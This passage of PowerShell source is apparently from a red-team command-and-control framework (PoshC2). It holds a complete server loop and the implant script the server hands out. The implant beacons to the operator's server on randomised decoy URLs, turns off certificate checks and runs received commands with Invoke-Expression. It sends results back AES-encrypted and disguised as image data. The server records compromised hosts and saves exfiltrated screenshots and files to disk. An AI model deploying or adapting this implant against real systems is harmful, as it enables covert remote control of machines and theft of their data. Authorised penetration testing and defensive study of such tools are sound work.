        VALUES (@RandomURI, @User, @Hostname, @IpAddress, @Key, @FirstSeen, @LastSeen, @PID, @Arch, @Domain, @Alive, @Sleep, @ModsLoaded)'

        Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
            RandomURI = $randomuri
            User      = $im_username
            Hostname  = $im_computername
            IpAddress = $request.RemoteEndPoint
            Key       = $key
            FirstSeen = "$(Get-Date)"
            LastSeen  = "$(Get-Date)"
            PID  = $im_pid
            Arch = $im_arch
            Domain = $im_domain
            Alive = "Yes"
            Sleep = $defaultbeacon
            ModsLoaded = ""
        }

        $message = '

$key="' + "$key"+'"
$sleeptime = '+$defaultbeacon+'
$payload = "' + "$payload"+'"

function getimgdata($cmdoutput) {
    $icoimage = @("'+$imageArray[-1]+'","'+$imageArray[0]+'","'+$imageArray[1]+'","'+$imageArray[2]+'","'+$imageArray[3]+'")
    
    try {$image = $icoimage|get-random}catch{}

    function randomgen 
    {
        param (
            [int]$Length
        )
        $set = "...................@..........................Tyscf".ToCharArray()
        $result = ""
        for ($x = 0; $x -lt $Length; $x++) 
        {$result += $set | Get-Random}
        return $result
    }
    $imageBytes = [Convert]::FromBase64String($image)
    $maxbyteslen = 1500
    $imagebyteslen = $imageBytes.Length
    $paddingbyteslen = $maxbyteslen - $imagebyteslen

    $BytePadding = [system.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
    $ImagePlusPad = New-Object byte[] $maxbyteslen
    $ImagePlusPadBytes = ($imageBytes+$BytePadding)
    $CombinedBytes = $ImagePlusPadBytes.length

    $CmdBytes = $cmdoutput
    $CmdBytesLen = $CmdBytes.Length

    $CombinedByteSize = $CmdBytesLen + $CombinedBytes
    $FullBuffer = New-Object byte[] $CombinedByteSize

    $FullBuffer = ($ImagePlusPadBytes+$CmdBytes)
    $FullBufferSize = $FullBuffer.length
    return $FullBuffer
}

function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
    if ($IV.getType().Name -eq "String") {
    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
    }
    else {
    $aesManaged.IV = $IV
    }
    }
    if ($key) {
    if ($key.getType().Name -eq "String") {
    $aesManaged.Key = [System.Convert]::FromBase64String($key)
    }
    else {
    $aesManaged.Key = $key
    }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    #$aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    #$aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
function Encrypt-String2($key, $unencryptedString) {
    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
    $DeflateStream.Dispose()
    $bytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}
function Decrypt-String2($key, $encryptedStringWithIV) {
    $bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
    $output
    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$URI= "'+$randomuri+'"
$Server = "'+$ipv4address+":"+$serverport+'/'+$randomuri+'"
$ServerClean = "'+$ipv4address+":"+$serverport+'"

while($true)
{
    $date = (Get-Date -Format "dd/MM/yyyy")
    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
    $killdate = [datetime]::ParseExact("'+$killdatefm+'","dd/MM/yyyy",$null)
    if ($killdate -lt $date) {exit}
    $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
    $newsleep = $sleeptimeran|get-random
    if ($newsleep -lt 1) {$newsleep = 5} 
    start-sleep $newsleep
    $URLS = "images/static/content/","news/?id=","webapp/static/","images/prints/","wordpress/site/","steam?p=","true/images/77/static?","holidngs/images/"
    $RandomURI = Get-Random $URLS
    $Server = "$ServerClean/$RandomURI$URI"
    try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
    
    while($ReadCommand) {
        $ReadCommandClear = Decrypt-String $key $ReadCommand
        $error.clear()
        if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
            if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
                    $splitcmd = $ReadCommandClear -replace "multicmd",""
                    $split = $splitcmd -split "!d-3dion@LD!-d"
                    foreach ($i in $split){
                        $error.clear()
                        if  ($i.ToLower().StartsWith("upload-file")) {
                            try {
                                $Output = Invoke-Expression $i | out-string
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                                $ModuleLoaded = Encrypt-String $key $result
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorUpload: " + $error[0]
                            }
                        } elseif  ($i.ToLower().StartsWith("loadmodule")) {
                            try {
                                $modulename = $i -replace "LoadModule",""
                                $Output = Invoke-Expression $modulename | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorLoadMod: " + $error[0]
                            }
                        } else {
                            try {
                                $Output = Invoke-Expression $i | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $StdError = ($error[0] | Out-String)
                                if ($StdError){
                                $Output = $Output + $StdError
                                $error.clear()
                                }
                            } catch {
                                $Output = "ErrorCmd: " + $error[0]
                            }
                            try {
                            $Output = Encrypt-String2 $key $Output
                            $Response = Encrypt-String $key $i
                            $UploadBytes = getimgdata $Output
                            (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
                            } catch{}
                        }
                    } 
            }
            elseif  ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
                try {
                $Output = Invoke-Expression $ReadCommandClear | out-string
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                $ModuleLoaded = Encrypt-String $key $result
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorUpload: " + $error[0]
                }

            } elseif  ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
                try {
                $modulename = $ReadCommandClear -replace "LoadModule",""
                $Output = Invoke-Expression $modulename | out-string  
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorLoadMod: " + $error[0]
                }

            } else {
                try {
                    $Output = Invoke-Expression $ReadCommandClear | out-string  
                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                    $StdError = ($error[0] | Out-String)
                    if ($StdError){
                    $Output = $Output + $StdError
                    $error.clear()
                    }
                } catch {
                    $Output = "ErrorCmd: " + $error[0]
                }
            try {
            $Output = Encrypt-String2 $key $Output
            $UploadBytes = getimgdata $Output
            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
            } catch {}
            }
        }
    break
    }
}'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($message)
$message =[Convert]::ToBase64String($Bytes)

    }

    $randomuriagents = Invoke-SqliteQuery -DataSource $Database -Query 'SELECT RandomURI FROM Implants' -As SingleValue
            
    foreach ($ranuri in $randomuriagents) 
    {
    if ($ranuri -ne $null) 
    {
        $im_results = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -As PSObject
        $key = $im_results.Key
        $hostname = $im_results.Hostname
        $currenttime = (Get-Date)
        $multicmdresults = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM NewTasks WHERE RandomURI='$ranuri'" -As PSObject
        # send multi commands to the client 
        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and ($multicmdresults))
        {
            $message = $null
            foreach ($i in $multicmdresults) {
                $taskid = $i.Command
                $taskidtime = $i.TaskID

                if (!$taskid.ToLower().startswith('fvdsghfdsyyh')) {
                    Write-Host "Command issued against host: $hostname" -ForegroundColor Yellow
                    if  ($taskid.ToLower().startswith('upload-file')) {
                    Write-Host -Object "Uploading File" -ForegroundColor Yellow
                    } else {
                    Write-Host -Object $taskid -ForegroundColor Yellow
                    }
                }
                if ($taskid.ToLower().StartsWith("loadmodule")) 
                {
                    $modulename = $taskid -replace 'LoadModule ', '' 
                    if (Test-Path "$PoshPath\Modules\$modulename") {
                    $module = (Get-Content -Path "$PoshPath\Modules\$modulename") -join "`n"
                    # ensure the module name 
                    $module = "LoadModule"+$module
                    if ($message) {
                        $message = $message + "!d-3dion@LD!-d" + $module
                    } else {
                        $message = $module 
                    }
                    } else {
                    Write-Host "Error finding module"
                    }
                }
                else 
                {
                    if ($message) {
                        $message = $message + "!d-3dion@LD!-d" + $taskid
                    } else {
                        $message = $taskid 
                    }
                }
                Invoke-SqliteQuery -DataSource $Database -Query "DELETE FROM NewTasks WHERE RandomURI='$ranuri' and TaskID='$taskidtime'"|out-null
            }

            if ($multicmdresults.Count -gt 1){
                $message = "multicmd" + $message
            }
            Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri'"|out-null
            $fromstring = Encrypt-String $key $message
            $commandsent = $fromstring
            $message = $fromstring                    
        }
        
        # send the default command/response if there is no command
        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'GET') -and ($multicmdresults.Count -eq 0)) 
        { 
            Invoke-SqliteQuery -DataSource $Database -Query "UPDATE Implants SET LastSeen='$(get-date)' WHERE RandomURI='$ranuri'"|out-null
            $message = 'fvdsghfdsyyh'
            $fromstring = Encrypt-String $key $message
            $commandsent = $fromstring
            $message = $fromstring
        } 

        # a completed command has returned to the c2 server
        if (($request.Url -like "*$ranuri*") -and ($request.HttpMethod -eq 'POST')) 
        { 
            $responseStream = $request.InputStream 
            $targetStream = New-Object -TypeName System.IO.MemoryStream 
            $buffer = new-object byte[] 10KB 
            $count = $responseStream.Read($buffer,0,$buffer.length) 
            $downloadedBytes = $count 
            while ($count -gt 0) 
            { 
                $targetStream.Write($buffer, 0, $count) 
                $count = $responseStream.Read($buffer,0,$buffer.length) 
                $downloadedBytes = $downloadedBytes + $count 
            } 

            $len = $targetStream.length
            $size = $len + 1
            $size2 = $len -1
            $buffer = New-Object byte[] $size
            $targetStream.Position = 0
            $targetStream.Read($buffer, 0, $targetStream.Length)|Out-null

            $targetStream.Flush()
            $targetStream.Close() 
            $targetStream.Dispose()

            # if you want to look at the image that is transfered back each time :)
            # [io.file]::WriteAllBytes("$global:newdir\TempHeuristicImage.png", $Buffer)
            $encryptedString = $buffer[1500..$size2]
            $cookiesin = $request.Cookies -replace 'SessionID=', ''
            $cookieplaintext = Decrypt-String $key $cookiesin   

            try {
            $backToPlainText = Decrypt-String2 $key $encryptedString
            }
            catch{             
            $backToPlainText = "Unable to decrypt message from host"
            $error.clear()
            $cookieplaintext = "Unable to decrypt message from host: $cookieplaintext. Could be too large and truncating data!"
            }
            
            # if the task was a screenshot, dump it directly to disk
            if ($cookieplaintext.tolower().startswith('get-screenshot'))
            {
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                try{
                $randomimageid = Get-RandomURI -Length 15
                $imagepath = "$global:newdir\downloads\$randomimageid.png"
                #Convert Base64 to Image
                $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''
                $imageBytes = [Convert]::FromBase64String($backToPlainText)
                $ms = New-Object -TypeName IO.MemoryStream -ArgumentList ($imageBytes, 0, $imageBytes.Length)
                $ms.Write($imageBytes, 0, $imageBytes.Length)
                $image = [System.Drawing.Image]::FromStream($ms, $true)
                $image.Save("$imagepath")
                $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
                }
                catch {
                $backToPlainText = "Screenshot not captured, the screen could be locked or this user does not have access to the screen!"
                Write-Host "Screenshot not captured, the screen could be locked or this user does not have access to the screen!" -ForegroundColor Red
                }
                $backToPlainText = "Captured Screenshot: $global:newdir\downloads\$randomimageid.png 123456<>654321"
            }
            # if the task was to download a file, dump it directly to disk
            if  ($cookieplaintext.tolower().startswith('download-file'))
            {
                try {
                $file = split-path $cookieplaintext -leaf
                $file = $file -replace "'", ""
                $file = $file.split('\.')[-1]
                $ramdomfileext = Get-RandomURI -Length 15
                $targetfile = "$global:newdir\downloads\$ramdomfileext.$file"   
                $backToPlainText = $backToPlainText -replace '123456(.+?)654321', ''        
                $fileBytes = [Convert]::FromBase64String($backToPlainText)
                [io.file]::WriteAllBytes($targetfile, $fileBytes)
                write-host "Downloaded file: $targetfile" -ForegroundColor Green

                } catch {
                Write-Host "File not downloaded, the size could be too large or the user may not have permissions!" -ForegroundColor Red
                }
                $backToPlainText = "Downloaded file: $targetfile 123456<>654321"
            }

            if ($backToPlainText -match '123456(.+?)654321')
            {$cmdlineinput = $matches[1]}
            $Query = 'INSERT
                INTO CompletedTasks (TaskID, RandomURI, Command, Output, Prompt)
            VALUES (@TaskID, @RandomURI, @Command, @Output, @Prompt)'

            Invoke-SqliteQuery -DataSource $Database -Query $Query -SqlParameters @{
                TaskID    = (Get-Date)
                RandomURI = "$ranuri"
                Command   = $cookieplaintext
                Output    = $backToPlainText -replace '123456(.+?)654321', ''
                Prompt    = $cmdlineinput
            }|out-null
            $message = "     "
        }
    }
    }

    # if a web request comes in that is not for the c2 server, send default 404 response
    if (!$message) {
        $message = $httpresponse
        Write-Output (Get-Date) | Out-File $global:newdir\Webserver.log -Append
        Write-Output $request | Out-File $global:newdir\Webserver.log -Append
    }
    
    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $response.StatusCode = 200
    $response.Headers.Add("CacheControl", "no-cache, no-store, must-revalidate")
    $response.Headers.Add("Pragma", "no-cache")
    $response.Headers.Add("Expires", 0)
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
    $message = $null
    $resultsdb = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM CompletedTasks WHERE CompletedTaskID=$taskiddb" -as PSObject
    if ($resultsdb)
    {
    $ranuri = $resultsdb.RandomURI
    $im_result = Invoke-SqliteQuery -DataSource $Database -Query "SELECT * FROM Implants WHERE RandomURI='$ranuri'" -as PSObject
    $implanthost = $im_result.User
    $im = Invoke-SqliteQuery -DataSource $Database -Query "SELECT User FROM Implants WHERE RandomURI='$ranuri'" -as SingleValue

        $taskcompledtime = $resultsdb.TaskID
        Write-Host "Command returned against host:" $im_result.Hostname $im_result.Domain "($taskcompledtime)" -ForegroundColor Green
        Write-Host -Object $resultsdb.Output -ForegroundColor Green
        $taskiddb ++
    }
}

$listener.Stop()
}
